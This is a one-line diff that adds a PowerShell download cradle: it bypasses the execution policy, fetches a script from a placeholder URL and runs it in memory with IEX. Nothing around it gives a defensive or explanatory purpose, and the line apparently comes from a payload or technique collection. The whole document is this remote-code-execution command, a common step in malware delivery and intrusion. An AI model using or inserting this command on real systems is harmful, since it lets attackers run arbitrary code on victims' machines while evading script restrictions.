@@ -1,0 +1,1 @@
+powershell.exe -exec bypass -C "IEX (New-Object System.Net.WebClient).DownloadString('%URL_TO_PS1_FILE%')"
